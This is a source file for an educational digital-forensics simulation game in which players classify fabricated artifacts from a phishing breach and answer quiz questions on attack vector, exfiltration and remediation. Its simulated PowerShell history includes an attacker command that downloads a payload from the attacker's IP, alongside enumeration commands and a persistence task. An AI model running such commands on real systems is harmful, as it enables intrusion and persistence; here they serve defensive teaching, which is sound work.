"use client";
// ============================================================
// DIGITAL FORENSICS SIMULATION
// Investigate the aftermath of the SOC phishing incident
// Lead analyst: Tha'lab (forensics fox)
// ============================================================
import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";

// ── Types ──────────────────────────────────────────────────────────────────────
interface Artifact {
  id: string;
  type: "log" | "file" | "registry" | "network" | "memory" | "email";
  icon: string;
  label: string;
  content: string;           // raw artifact content shown to user
  significance: "critical" | "relevant" | "benign";
  explanation: string;       // revealed after classification
}

interface Decision {
  q: string;
  opts: { text: string; correct: boolean; consequence: string }[];
}

interface Phase {
  id: string;
  title: string;
  subtitle: string;
  thalab: string;            // Tha'lab's opening narration
  artifacts: Artifact[];
  decision: Decision;
  timelineEntry: string;     // added to board when phase complete
}

// ── Evidence classification helper ────────────────────────────────────────────
const SIG_CONFIG = {
  critical: { color: "#dc2626", bg: "rgba(220,38,38,0.08)", label: "Critical Evidence", icon: "🔴" },
  relevant: { color: "#ca8a04", bg: "rgba(202,138,4,0.08)",  label: "Relevant",          icon: "🟡" },
  benign:   { color: "#16a34a", bg: "rgba(22,163,74,0.07)",  label: "Benign",            icon: "🟢" },
};

const ARTIFACT_ICONS = {
  log:      "📋",
  file:     "📄",
  registry: "🗂",
  network:  "🌐",
  memory:   "💾",
  email:    "📧",
};

// ── Investigation phases ───────────────────────────────────────────────────────
const PHASES: Phase[] = [
  {
    id: "initial_triage",
    title: "Phase 1 — Initial Triage",
    subtitle: "48 hours after the incident. Hamad's workstation has been isolated.",
    thalab: "First thing we do is establish the timeline anchor. I need to know exactly when this machine was compromised — not when someone noticed, when it actually happened. Let's start with the Windows Event logs and the browser history.",
    artifacts: [
      {
        id: "evt_4624",
        type: "log",
        icon: "📋",
        label: "Windows Event Log — Event ID 4624",
        content: `EventID: 4624 (Successful Logon)
Time:    2026-05-14  03:47:22 UTC
Account: HAMAD.AL-RASHIDI
LogonType: 3 (Network)
Source IP: 185.220.101.47
Workstation: HAMAD-PC
AuthPackage: NTLM`,
        significance: "critical",
        explanation: "A successful network logon at 3:47 AM from an external IP using NTLM — this is the moment the attacker gained access using Hamad's stolen credentials. LogonType 3 from outside the network at this hour is a clear red flag.",
      },
      {
        id: "browser_history",
        type: "file",
        icon: "📄",
        label: "Chrome History — May 14, 2026",
        content: `08:42 — https://qnb.com.qa (Qatar National Bank)
08:51 — https://qnb-secure-verify.net/login  ← PHISHING SITE
08:52 — https://qnb-secure-verify.net/verify-account
08:53 — https://qnb.com.qa (returned to real site)
09:15 — https://mail.google.com
11:30 — https://www.youtube.com`,
        significance: "critical",
        explanation: "This is the entry point. At 08:51, Hamad visited a phishing site that mirrored QNB. The 1-minute visit and immediate return to the real site confirms he realised something was wrong — but his credentials were already captured.",
      },
      {
        id: "pdf_recent",
        type: "file",
        icon: "📄",
        label: "Recent Files — AppData\\Roaming\\Microsoft",
        content: `Last accessed files (May 14, 2026):
08:30  Q1_Salaries_Draft.xlsx
08:35  IT_Policy_2026.pdf
08:50  QNB_Statement_April.pdf   ← opened from email
09:00  Meeting_Notes.docx
11:00  Project_Phoenix_Budget.xlsx`,
        significance: "relevant",
        explanation: "QNB_Statement_April.pdf was opened from an email at 08:50 — one minute before Hamad visited the phishing site. This was almost certainly the lure document that contained the malicious link.",
      },
      {
        id: "antivirus_log",
        type: "log",
        icon: "📋",
        label: "Windows Defender Log — May 14",
        content: `[08:50:14] Scan: QNB_Statement_April.pdf — No threats detected
[09:45:00] Real-time protection: ON
[10:30:45] Scan: Meeting_Notes.docx — No threats detected
[11:00:00] Scheduled scan complete — 0 threats found`,
        significance: "benign",
        explanation: "The antivirus found nothing — which is expected. Phishing attacks deliver the payload through the browser and stolen credentials, not through malware that AV would detect. A clean AV log doesn't mean the machine is clean.",
      },
    ],
    decision: {
      q: "Based on initial triage, what was the primary attack vector?",
      opts: [
        { text: "Malware delivered via email attachment",              correct: false, consequence: "The AV logs show no malware. The PDF opened cleanly. The attack used credential theft, not malware execution." },
        { text: "Credential theft via phishing site after email lure", correct: true,  consequence: "Correct. The PDF lure → phishing site → stolen NTLM credentials → 3:47 AM remote logon. This is a textbook spear-phishing credential harvest." },
        { text: "Brute-force attack on Hamad's account",               correct: false, consequence: "Event ID 4624 shows a single successful logon, not repeated failures. Brute-force would produce dozens of 4625 (failed logon) events before a 4624." },
      ],
    },
    timelineEntry: "08:51 — Hamad clicks phishing link in QNB lure email. Credentials captured. 03:47 next day — attacker uses stolen credentials for remote network logon.",
  },

  {
    id: "lateral_movement",
    title: "Phase 2 — Lateral Movement",
    subtitle: "The attacker is inside. Where did they go?",
    thalab: "They logged in at 3:47 AM — when no one is watching. That's deliberate. Now I want to know what they touched in those quiet hours. Network share access logs, PowerShell history, and scheduled tasks are my next stops.",
    artifacts: [
      {
        id: "smb_access",
        type: "network",
        icon: "🌐",
        label: "SMB Share Access Log — File Server FS-01",
        content: `[03:47:31] HAMAD.AL-RASHIDI connected from 185.220.101.47
[03:48:05] READ  \\\\FS-01\\HR\\Salaries_2026.xlsx
[03:48:22] READ  \\\\FS-01\\HR\\Employee_Records.xlsx
[03:49:10] READ  \\\\FS-01\\Finance\\Q1_Budget.xlsx
[03:49:45] READ  \\\\FS-01\\Finance\\Bank_Details.xlsx
[03:50:33] WRITE \\\\FS-01\\IT\\Temp\\svc_update.exe  ← UPLOADED
[03:51:00] HAMAD.AL-RASHIDI disconnected`,
        significance: "critical",
        explanation: "Within 4 minutes the attacker read 4 sensitive files — HR salaries, employee records, financial data, bank details. But the most alarming entry: they uploaded svc_update.exe to a shared IT folder. This is staging malware for later execution.",
      },
      {
        id: "powershell_history",
        type: "log",
        icon: "📋",
        label: "PowerShell History — HAMAD-PC",
        content: `ConsoleHost_history.txt (May 14, 03:47-03:51):

Get-ADUser -Filter * -Properties * | Select Name,Email,Department
net view /domain
Get-SmbShare
whoami /all
nltest /domain_trusts
Invoke-WebRequest -Uri "http://185.220.101.47/payload" -OutFile "C:\\Windows\\Temp\\svc.exe"`,
        significance: "critical",
        explanation: "Classic attacker playbook: enumerate users → find shares → map domain trusts → download second-stage payload. The Invoke-WebRequest downloading from the attacker's own IP is definitive proof of command-and-control activity.",
      },
      {
        id: "scheduled_task",
        type: "registry",
        icon: "🗂",
        label: "Task Scheduler — Registered Tasks",
        content: `Task: "Windows Service Updater"
Created: 2026-05-14  03:50:47
Run as: SYSTEM
Trigger: Every 4 hours, starting 08:00
Action: C:\\Windows\\Temp\\svc.exe /quiet
Status: ENABLED

(Normal system tasks for comparison)
Task: "Windows Defender Update" — Microsoft Corporation
Task: "Windows Update"          — Microsoft Corporation`,
        significance: "critical",
        explanation: "The attacker created a persistence mechanism. svc.exe runs every 4 hours as SYSTEM — the highest privilege level. This is how they planned to maintain access after the initial session ended. This task must be disabled and the file deleted immediately.",
      },
      {
        id: "dns_queries",
        type: "network",
        icon: "🌐",
        label: "DNS Query Log — Internal Resolver",
        content: `HAMAD-PC DNS queries (May 14, 03:47-04:00):

185.220.101.47.in-addr.arpa    PTR lookup
c2-panel.darkhosting.io        A record — RESOLVED
update-service.legit-cdn.net   A record — RESOLVED
accounts.google.com            A record (normal)
mail.google.com                A record (normal)`,
        significance: "relevant",
        explanation: "The DNS queries to c2-panel.darkhosting.io and update-service.legit-cdn.net are command-and-control infrastructure. The attacker used legitimate-sounding domain names to blend C2 traffic with normal web traffic.",
      },
    ],
    decision: {
      q: "The attacker uploaded svc_update.exe to the shared IT folder. What was their most likely intent?",
      opts: [
        { text: "To corrupt IT backups and prevent recovery",                    correct: false, consequence: "Corrupting backups is a ransomware tactic. The scheduled task running svc.exe every 4 hours points to persistence and repeated access, not destruction." },
        { text: "To establish persistence and spread to other machines via IT",  correct: true,  consequence: "Correct. Placing an executable in a shared IT folder with a scheduled SYSTEM task is a classic persistence-plus-spread technique. IT staff or automated processes might execute it on other machines." },
        { text: "To hide the malware from the antivirus by using a shared path", correct: false, consequence: "AV scans shared paths too. The shared IT folder was chosen because IT staff have high trust and frequent access — it's about propagation, not AV evasion." },
      ],
    },
    timelineEntry: "03:48–03:50 — Attacker exfiltrates HR and Finance files from FS-01. Uploads svc_update.exe to IT share. Creates scheduled task for persistence every 4 hours.",
  },

  {
    id: "exfiltration",
    title: "Phase 3 — Data Exfiltration",
    subtitle: "What data actually left the network?",
    thalab: "The file reads on FS-01 tell us what they accessed. But accessing and exfiltrating are different — I need to prove data actually left. Firewall egress logs and email gateway are my focus now. This is where we determine the real impact.",
    artifacts: [
      {
        id: "firewall_egress",
        type: "network",
        icon: "🌐",
        label: "Palo Alto Firewall — Egress Traffic (May 14)",
        content: `03:51:05  HAMAD-PC → 185.220.101.47:443   ALLOW  48.2 MB  HTTPS
03:51:08  HAMAD-PC → 185.220.101.47:443   ALLOW   3.1 MB  HTTPS
04:00:00  HAMAD-PC → 185.220.101.47:443   ALLOW   1.2 MB  HTTPS

(For reference — normal business traffic same day):
09:00     HAMAD-PC → mail.google.com:443   12 KB  HTTPS
09:15     HAMAD-PC → teams.microsoft.com   84 KB  HTTPS`,
        significance: "critical",
        explanation: "48.2 MB transferred over HTTPS to the attacker's IP at 3:51 AM is definitive exfiltration. For reference, the Salaries_2026.xlsx and Employee_Records.xlsx together are approximately 45 MB. The data left the network encrypted, which is why the firewall didn't block it — HTTPS looks like normal web traffic.",
      },
      {
        id: "email_gateway",
        type: "email",
        icon: "📧",
        label: "Email Gateway Log — Outbound (May 14)",
        content: `From:    hamad.al-rashidi@company.qa
To:      backup.files.2026@protonmail.com
Time:    03:52:14
Subject: (no subject)
Attachments:
  - Salaries_2026.xlsx     (22.4 MB)
  - Employee_Records.xlsx  (23.1 MB)
  - Q1_Budget.xlsx          (4.8 MB)
  - Bank_Details.xlsx       (1.9 MB)
Status:  DELIVERED`,
        significance: "critical",
        explanation: "The attacker also emailed the files to a ProtonMail address — a secondary exfiltration channel in case the firewall blocked the direct transfer. Both succeeded. ProtonMail is end-to-end encrypted, making content recovery impossible. This confirms exactly what was stolen.",
      },
      {
        id: "dlp_alerts",
        type: "log",
        icon: "📋",
        label: "Data Loss Prevention (DLP) Alerts",
        content: `[03:51:03] ALERT: Large file upload detected
           Threshold: 10 MB | Actual: 48.2 MB
           Destination: 185.220.101.47
           Action taken: LOGGED (policy: monitor-only)

[03:52:14] ALERT: PII keywords in outbound email
           Keywords matched: salary, employee ID, IBAN
           Action taken: LOGGED (policy: monitor-only)`,
        significance: "relevant",
        explanation: "The DLP system saw everything and logged it — but was in monitor-only mode, so it took no action. If the DLP policy had been set to block, both exfiltration attempts would have been stopped. This is a critical policy gap to report.",
      },
      {
        id: "vpn_log",
        type: "network",
        icon: "🌐",
        label: "VPN Connection Log — Perimeter",
        content: `No VPN sessions from external IP 185.220.101.47
No VPN sessions in the 02:00-05:00 window

(Attacker used direct NTLM authentication to SMB,
bypassing VPN entirely via exposed port 445)`,
        significance: "relevant",
        explanation: "The attacker didn't need VPN because SMB port 445 was exposed directly to the internet. This is a critical network segmentation failure — internal file shares should never be reachable from outside without VPN.",
      },
    ],
    decision: {
      q: "The DLP system detected both exfiltration events but didn't stop them. What is the correct remediation?",
      opts: [
        { text: "Replace the DLP system with a newer model",                                    correct: false, consequence: "The DLP system worked correctly — it detected both events. The problem is the policy was set to monitor-only. Replacing hardware doesn't fix a policy decision." },
        { text: "Change DLP policy to block mode and close SMB port 445 from external access", correct: true,  consequence: "Correct on both counts. Block mode would have stopped the email exfiltration. Closing port 445 would have prevented the attacker from accessing SMB shares directly from the internet." },
        { text: "Encrypt all files on FS-01 so exfiltrated data is unreadable",                correct: false, consequence: "The attacker authenticated as Hamad — they would have the same decryption access Hamad has. Encryption at rest doesn't protect against authenticated access." },
      ],
    },
    timelineEntry: "03:51 — 48.2 MB exfiltrated directly to attacker IP over HTTPS. 03:52 — Same data emailed to ProtonMail as backup channel. DLP detected both; policy was monitor-only.",
  },

  {
    id: "attacker_profile",
    title: "Phase 4 — Attribution & TTPs",
    subtitle: "Who did this, and will they come back?",
    thalab: "We know the what and the how. Now I want the who. Threat intelligence on the attacker's infrastructure, their techniques, and whether this was targeted or opportunistic. This shapes our defensive response more than anything else.",
    artifacts: [
      {
        id: "threat_intel",
        type: "file",
        icon: "📄",
        label: "VirusTotal — IP 185.220.101.47",
        content: `IP: 185.220.101.47
Country: Netherlands (Tor exit node)
Last seen: 2026-05-14
Detections: 47/94 security vendors

Tags: tor-exit, c2-server, phishing-host, apt-infrastructure
Associated domains:
  - qnb-secure-verify.net    (phishing — Qatar banking)
  - qiib-account-verify.net  (phishing — Qatar banking)  
  - metrash-portal-qa.net    (phishing — Qatar government)

Related campaigns: "Gulf Finance 2026" cluster`,
        significance: "critical",
        explanation: "This IP is a known Tor exit node used as C2 infrastructure. The associated phishing domains are all Qatar-specific — QNB, QIIB, Metrash. This is not opportunistic. Someone specifically built infrastructure targeting Qatari financial and government organisations.",
      },
      {
        id: "mitre_ttps",
        type: "file",
        icon: "📄",
        label: "MITRE ATT&CK Mapping",
        content: `Techniques observed in this incident:

T1566.001  Spearphishing Attachment (initial access)
T1078      Valid Accounts (credential use)
T1021.002  SMB/Windows Admin Shares (lateral movement)
T1059.001  PowerShell (execution)
T1053.005  Scheduled Task (persistence)
T1041      Exfiltration Over C2 Channel
T1048.003  Exfiltration Over Alternative Protocol (email)
T1070.004  File Deletion (anti-forensics)

Similarity score to known group: TA0045 "GulfStealer" — 87%`,
        significance: "relevant",
        explanation: "The MITRE mapping tells us this attacker has a consistent playbook. An 87% similarity to a known threat group means this is likely the same actors. That also means they have known tools, infrastructure patterns, and targets — all of which help predict their next move.",
      },
      {
        id: "ioc_list",
        type: "file",
        icon: "📄",
        label: "Indicators of Compromise (IOCs)",
        content: `NETWORK:
  185.220.101.47          — Attacker C2 IP
  c2-panel.darkhosting.io — C2 domain
  qnb-secure-verify.net   — Phishing domain

FILES:
  svc_update.exe  SHA256: a3f2c8e1d9b4f7a2c5e8d1b4f7a2c5e8
  svc.exe         SHA256: 7b2e9c4f1a6d3e8b2c5f9e4d1a7b3e6c

REGISTRY:
  HKLM\SOFTWARE\Microsoft\Windows NT\
  CurrentVersion\Schedule\TaskCache\
  Tasks\{Windows Service Updater}

EMAIL:
  backup.files.2026@protonmail.com`,
        significance: "relevant",
        explanation: "These IOCs must be immediately shared with CERT.Qatar, your firewall vendor, and other Qatari organisations. If the same actors are targeting multiple organisations — which the phishing infrastructure suggests — early sharing could prevent the next victim.",
      },
      {
        id: "deleted_files",
        type: "memory",
        icon: "💾",
        label: "Recycle Bin & Volume Shadow Copies",
        content: `Recycle Bin (HAMAD-PC, May 14):
  [DELETED 03:51:58] C:\\Windows\\Temp\\svc.exe
  [DELETED 03:51:59] C:\\Windows\\Temp\\payload

Volume Shadow Copies:
  VSS snapshot from 2026-05-13 18:00 — DELETED (03:52:01)
  VSS snapshot from 2026-05-14 00:00 — DELETED (03:52:02)

Note: Files recovered from memory dump.
Permanent deletion prevented forensic tool "Autopsy" from 
recovering originals — memory acquisition was critical here.`,
        significance: "critical",
        explanation: "The attacker deleted their tools AND destroyed shadow copies — standard anti-forensics. Shadow copies are Windows' built-in backup mechanism; deleting them prevents rolling back to a clean state. We only recovered the files because memory was captured before the machine was rebooted.",
      },
    ],
    decision: {
      q: "The attacker deleted shadow copies before leaving. What does this tell you about their level of sophistication?",
      opts: [
        { text: "Low sophistication — deleting files is basic and any attacker would do it",     correct: false, consequence: "Shadow copy deletion is specifically targeted at incident response procedures. Knowing to delete VSS copies, not just files, indicates knowledge of Windows forensics and recovery processes." },
        { text: "High sophistication — they knew exactly how IR teams recover systems",          correct: true,  consequence: "Correct. VSS deletion is a deliberate anti-forensics technique. Combined with MITRE attribution and Qatar-specific infrastructure, this is a capable, targeted threat actor — not a script kiddie." },
        { text: "Medium sophistication — they used automated tools that delete by default",      correct: false, consequence: "Possible, but the overall picture — custom phishing infrastructure, domain-trust enumeration, scheduled task persistence, dual exfiltration — suggests deliberate planning beyond automated tooling." },
      ],
    },
    timelineEntry: "Attacker identified as likely 'GulfStealer' cluster targeting Qatari organisations. All IOCs documented. Shadow copies deleted as anti-forensics measure.",
  },

  {
    id: "final_report",
    title: "Phase 5 — Reporting & Recommendations",
    subtitle: "Build the incident report and secure the organisation.",
    thalab: "This is where forensics meets impact. I've got the full picture — now I need to translate it into a report that the board can understand and that gives the security team a clear remediation path. Every finding needs a recommendation attached to it.",
    artifacts: [
      {
        id: "affected_systems",
        type: "log",
        icon: "📋",
        label: "Blast Radius Assessment",
        content: `Systems confirmed compromised:
  HAMAD-PC              — Patient zero workstation
  FS-01 (file server)   — Data exfiltrated
  
Systems at risk (svc_update.exe in shared folder):
  All machines with access to \\\\FS-01\\IT\\Temp\\
  Estimated: 47 workstations across 3 departments

Data confirmed exfiltrated:
  Salaries_2026.xlsx     → 234 employee salary records
  Employee_Records.xlsx  → 234 names, IDs, home addresses
  Q1_Budget.xlsx         → Department financial data
  Bank_Details.xlsx      → 18 corporate IBAN numbers`,
        significance: "critical",
        explanation: "The blast radius is significant. 234 employees have had their personal and salary data stolen. This triggers a PDPPL (Qatar Personal Data Privacy Protection Law) breach notification obligation within 72 hours of discovery.",
      },
      {
        id: "regulatory",
        type: "file",
        icon: "📄",
        label: "Regulatory Obligations — Qatar",
        content: `PDPPL (Law No. 13 of 2016):
  Article 18: Breach notification to NPC required
  Deadline: 72 hours from discovery
  Status: OVERDUE if not filed by: 2026-05-16 10:00

CERT.Qatar:
  Mandatory reporting for critical infrastructure incidents
  IOC sharing: Strongly recommended
  Portal: www.cert.gov.qa

Affected employees:
  Must be individually notified under PDPPL
  Notification must include: what was taken, risk assessment,
  recommended protective actions (credit monitoring, etc.)`,
        significance: "critical",
        explanation: "Qatar's data protection law requires breach notification. This is not optional. Failure to notify within 72 hours carries regulatory penalties. The CISO and legal team need this information immediately — the forensic report is also legal evidence.",
      },
      {
        id: "remediation_checklist",
        type: "file",
        icon: "📄",
        label: "Immediate Remediation Checklist",
        content: `IMMEDIATE (next 2 hours):
  ✗ Reset Hamad's credentials across all systems
  ✗ Delete svc_update.exe from \\\\FS-01\\IT\\Temp\\
  ✗ Disable scheduled task "Windows Service Updater" on all machines
  ✗ Block IP 185.220.101.47 at perimeter firewall
  ✗ Block domains: c2-panel.darkhosting.io, darkhosting.io
  ✗ File CERT.Qatar incident report

SHORT TERM (this week):
  ✗ Close SMB port 445 from external internet access
  ✗ Change DLP policy from monitor-only to block
  ✗ Mandatory MFA rollout for all staff
  ✗ Notify 234 affected employees

STRATEGIC (next quarter):
  ✗ Network segmentation review
  ✗ Phishing simulation training for all staff
  ✗ Threat intelligence subscription
  ✗ 24/7 SOC monitoring implementation`,
        significance: "relevant",
        explanation: "Remediation must be prioritised by urgency. The scheduled task is the most dangerous active threat — svc_update.exe could execute on 47 machines in the next 4-hour cycle. That must be killed before anything else.",
      },
      {
        id: "lessons_learned",
        type: "file",
        icon: "📄",
        label: "Root Cause Analysis",
        content: `PRIMARY ROOT CAUSE:
  No MFA on corporate accounts
  → Stolen password = immediate full access

CONTRIBUTING FACTORS:
  1. SMB port 445 exposed to internet
     → Enabled direct share access without VPN
  
  2. DLP in monitor-only mode
     → Detected exfiltration but couldn't stop it
  
  3. No phishing-resistant email security
     → Lure email bypassed email gateway
  
  4. No 24/7 monitoring
     → 3:47 AM activity undetected until next day
  
  5. Hamad had broader file access than his role required
     → Principle of least privilege not enforced`,
        significance: "relevant",
        explanation: "Root cause analysis is about fixing systems, not blaming individuals. Hamad did what most people would do when they receive a convincing phishing email. The organisation's job is to make that single human error survivable — five separate controls failed before the attack succeeded.",
      },
    ],
    decision: {
      q: "Which remediation must happen in the NEXT HOUR, before anything else?",
      opts: [
        { text: "Notify all 234 affected employees by email",                                          correct: false, consequence: "Employee notification is important but not the most urgent. The scheduled task svc_update.exe could execute on 47 machines in the next 4-hour cycle — that active threat must be neutralised first." },
        { text: "Delete svc_update.exe and disable the scheduled task on all accessible machines",     correct: true,  consequence: "Correct. This is the active, ongoing threat. Every 4 hours the malware could spread to 47 more workstations. Containing this takes priority over reporting, notification, or any other remediation." },
        { text: "Close SMB port 445 and change DLP to block mode on the perimeter firewall",          correct: false, consequence: "Critical strategic fixes — but the attacker is already inside. Closing the door helps against future attacks, but the scheduled task is a running fire that needs to be extinguished first." },
      ],
    },
    timelineEntry: "Investigation complete. 234 employees' data confirmed exfiltrated. PDPPL notification required. Scheduled task identified as active threat requiring immediate neutralisation.",
  },
];

// ── Evidence Board Timeline ────────────────────────────────────────────────────
function EvidenceBoard({ entries }: { entries: string[] }) {
  return (
    <div style={{ background:"rgba(0,0,0,0.25)", borderRadius:10, padding:"14px 16px", border:"1px solid rgba(251,191,36,0.2)" }}>
      <div style={{ fontSize:9, letterSpacing:"0.25em", color:"rgba(251,191,36,0.6)", marginBottom:10, fontFamily:"'JetBrains Mono',monospace" }}>
        ◎ INCIDENT TIMELINE
      </div>
      {entries.length === 0 ? (
        <div style={{ fontSize:11, color:"rgba(255,255,255,0.25)", fontStyle:"italic" }}>Complete investigation phases to build the timeline…</div>
      ) : (
        entries.map((e, i) => (
          <div key={i} style={{ display:"flex", gap:10, marginBottom: i < entries.length - 1 ? 10 : 0, alignItems:"flex-start" }}>
            <div style={{ width:2, background:"rgba(251,191,36,0.4)", borderRadius:1, alignSelf:"stretch", flexShrink:0, minHeight:20 }}/>
            <div style={{ fontSize:11, color:"rgba(251,191,36,0.85)", lineHeight:1.65, fontFamily:"'JetBrains Mono',monospace" }}>{e}</div>
          </div>
        ))
      )}
    </div>
  );
}

// ── Artifact Card ─────────────────────────────────────────────────────────────
function ArtifactCard({
  artifact, classified, onClassify,
}: {
  artifact: Artifact;
  classified: "critical" | "relevant" | "benign" | null;
  onClassify: (sig: "critical" | "relevant" | "benign") => void;
}) {
  const [expanded, setExpanded] = useState(false);
  const cfg = classified ? SIG_CONFIG[classified] : null;

  return (
    <div style={{
      background: classified ? cfg!.bg : "rgba(255,255,255,0.04)",
      borderRadius:10, border:`1px solid ${classified ? cfg!.color + "40" : "rgba(255,255,255,0.08)"}`,
      overflow:"hidden", transition:"all .2s",
    }}>
      {/* Header */}
      <div onClick={() => setExpanded(!expanded)}
        style={{ padding:"12px 16px", cursor:"pointer", display:"flex", gap:10, alignItems:"center" }}>
        <span style={{ fontSize:18, flexShrink:0 }}>{ARTIFACT_ICONS[artifact.type]}</span>
        <div style={{ flex:1, minWidth:0 }}>
          <div style={{ fontSize:11, color:"rgba(255,255,255,0.5)", marginBottom:2, fontFamily:"'JetBrains Mono',monospace", letterSpacing:"0.08em" }}>
            {artifact.type.toUpperCase()}
          </div>
          <div style={{ fontSize:13, color:"rgba(255,255,255,0.9)", fontWeight:600, lineHeight:1.3 }}>{artifact.label}</div>
        </div>
        {classified && (
          <span style={{ fontSize:10, padding:"2px 8px", borderRadius:12, background:cfg!.bg, border:`1px solid ${cfg!.color}50`, color:cfg!.color, fontWeight:700, flexShrink:0 }}>
            {cfg!.icon} {cfg!.label}
          </span>
        )}
        <span style={{ color:"rgba(255,255,255,0.3)", fontSize:12 }}>{expanded ? "▲" : "▼"}</span>
      </div>

      {/* Content */}
      {expanded && (
        <div style={{ borderTop:"1px solid rgba(255,255,255,0.06)" }}>
          <pre style={{ margin:0, padding:"14px 16px", fontSize:11, color:"rgba(255,255,255,0.7)", lineHeight:1.75, fontFamily:"'JetBrains Mono',monospace", whiteSpace:"pre-wrap", background:"rgba(0,0,0,0.2)", overflowX:"auto" }}>
            {artifact.content}
          </pre>

          {/* Classification buttons */}
          {!classified ? (
            <div style={{ padding:"12px 16px", display:"flex", gap:8, flexWrap:"wrap" }}>
              <div style={{ fontSize:11, color:"rgba(255,255,255,0.4)", width:"100%", marginBottom:4 }}>Classify this artifact:</div>
              {(["critical","relevant","benign"] as const).map(sig => {
                const c = SIG_CONFIG[sig];
                return (
                  <button key={sig} onClick={() => onClassify(sig)}
                    style={{ padding:"6px 14px", borderRadius:7, border:`1px solid ${c.color}50`, background:`${c.color}10`, color:c.color, fontSize:11, fontWeight:700, cursor:"pointer", letterSpacing:"0.08em", fontFamily:"'JetBrains Mono',monospace" }}>
                    {c.icon} {c.label}
                  </button>
                );
              })}
            </div>
          ) : (
            <div style={{ padding:"12px 16px", background:`${cfg!.color}08`, borderTop:`1px solid ${cfg!.color}20` }}>
              <div style={{ fontSize:11, color:cfg!.color, fontWeight:700, marginBottom:4 }}>Tha'lab's Analysis:</div>
              <div style={{ fontSize:12, color:"rgba(255,255,255,0.7)", lineHeight:1.7 }}>{artifact.explanation}</div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ── Main Simulation ───────────────────────────────────────────────────────────
export default function ForensicsSim({ onHome }: { onHome?: () => void }) {
  const router = useRouter();
  const [phaseIdx, setPhaseIdx]     = useState(0);
  const [classifications, setClassifications] = useState<Record<string, "critical"|"relevant"|"benign">>({});
  const [decision, setDecision]     = useState<number | null>(null);
  const [showResult, setShowResult] = useState(false);
  const [timeline, setTimeline]     = useState<string[]>([]);
  const [score, setScore]           = useState(0);
  const [complete, setComplete]     = useState(false);
  const [showBoard, setShowBoard]   = useState(false);
  const scrollRef = useRef<HTMLDivElement>(null);

  const phase = PHASES[phaseIdx];
  const allClassified = phase.artifacts.every(a => classifications[a.id]);
  const correctDecisions = phase.decision.opts.filter(o => o.correct).length;

  const handleClassify = (artifactId: string, sig: "critical"|"relevant"|"benign") => {
    setClassifications(prev => ({ ...prev, [artifactId]: sig }));
    // Award points for correct classifications
    const artifact = phase.artifacts.find(a => a.id === artifactId);
    if (artifact && sig === artifact.significance) {
      setScore(s => s + 25);
    }
  };

  const handleDecision = (idx: number) => {
    if (decision !== null) return;
    setDecision(idx);
    if (phase.decision.opts[idx].correct) setScore(s => s + 100);
    setTimeout(() => setShowResult(true), 300);
  };

  const handleNextPhase = () => {
    setTimeline(prev => [...prev, phase.timelineEntry]);
    if (phaseIdx + 1 >= PHASES.length) {
      setComplete(true);
    } else {
      setPhaseIdx(p => p + 1);
      setDecision(null);
      setShowResult(false);
      scrollRef.current?.scrollTo({ top: 0, behavior: "smooth" });
    }
  };

  const maxScore = PHASES.length * 100 + PHASES.reduce((acc, p) => acc + p.artifacts.length * 25, 0);
  const pct = Math.round((score / maxScore) * 100);

  // ── COMPLETE SCREEN ────────────────────────────────────────────────────────
  if (complete) {
    return (
      <div style={{ minHeight:"100vh", background:"#0a0e1a", display:"flex", alignItems:"center", justifyContent:"center", padding:"2rem", fontFamily:"'JetBrains Mono',monospace" }}>
        <div style={{ maxWidth:640, width:"100%", textAlign:"center" }}>
          <div style={{ fontSize:56, marginBottom:16 }}>🦊</div>
          <div style={{ fontSize:9, letterSpacing:"0.35em", color:"rgba(251,191,36,0.6)", marginBottom:10 }}>INVESTIGATION COMPLETE</div>
          <h1 style={{ fontFamily:"'Cinzel',serif", fontSize:"clamp(1.6rem,3vw,2.2rem)", color:"#f5ede0", fontWeight:700, margin:"0 0 8px" }}>
            Case Closed
          </h1>
          <div style={{ width:56, height:2, background:"linear-gradient(90deg,#fbbf24,transparent)", margin:"0 auto 20px" }}/>

          <div style={{ background:"rgba(251,191,36,0.06)", border:"1px solid rgba(251,191,36,0.2)", borderRadius:12, padding:"1.4rem", marginBottom:"1.5rem" }}>
            <div style={{ fontSize:11, color:"rgba(251,191,36,0.6)", marginBottom:8 }}>INVESTIGATION SCORE</div>
            <div style={{ fontSize:48, fontWeight:700, color:"#fbbf24", marginBottom:4 }}>{pct}%</div>
            <div style={{ fontSize:12, color:"rgba(255,255,255,0.5)" }}>{score} / {maxScore} points</div>
          </div>

          {/* Full timeline */}
          <div style={{ textAlign:"left", marginBottom:"1.5rem" }}>
            <EvidenceBoard entries={[...timeline, phase.timelineEntry]} />
          </div>

          <div style={{ background:"rgba(255,255,255,0.03)", borderRadius:10, padding:"14px 16px", marginBottom:"1.5rem", textAlign:"left", border:"1px solid rgba(255,255,255,0.07)" }}>
            <div style={{ fontSize:9, letterSpacing:"0.2em", color:"rgba(251,191,36,0.5)", marginBottom:8 }}>THA'LAB'S CLOSING STATEMENT</div>
            <p style={{ fontSize:12, color:"rgba(255,255,255,0.7)", lineHeight:1.8, margin:0 }}>
              "Good work. What started as a phishing email ended with 234 employees' data in attacker hands. The technical evidence is airtight — but the real lesson is that five separate controls failed before this breach became catastrophic. MFA alone would have stopped everything after the credential theft. Remember: forensics tells you what happened. Good security architecture means you never have to investigate in the first place."
            </p>
          </div>

          <div style={{ display:"flex", gap:10, justifyContent:"center" }}>
            <button onClick={() => { setPhaseIdx(0); setClassifications({}); setDecision(null); setShowResult(false); setTimeline([]); setScore(0); setComplete(false); }}
              style={{ padding:"10px 24px", borderRadius:8, border:"1.5px solid rgba(251,191,36,0.4)", background:"transparent", color:"#fbbf24", fontSize:11, fontWeight:700, cursor:"pointer", letterSpacing:"0.15em" }}>
              Reinvestigate
            </button>
            <button onClick={() => onHome ? onHome() : router.push("/soc")}
              style={{ padding:"10px 24px", borderRadius:8, border:"none", background:"rgba(251,191,36,0.12)", color:"#fbbf24", fontSize:11, fontWeight:700, cursor:"pointer", letterSpacing:"0.15em" }}>
              Return to SOC
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ── MAIN LAYOUT ────────────────────────────────────────────────────────────
  return (
    <div style={{ minHeight:"100vh", background:"#0a0e1a", fontFamily:"'DM Sans',sans-serif", color:"rgba(255,255,255,0.9)" }}>
      <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=JetBrains+Mono:wght@400;700&family=DM+Sans:wght@300;400;600;700&display=swap" rel="stylesheet"/>

      {/* Top bar */}
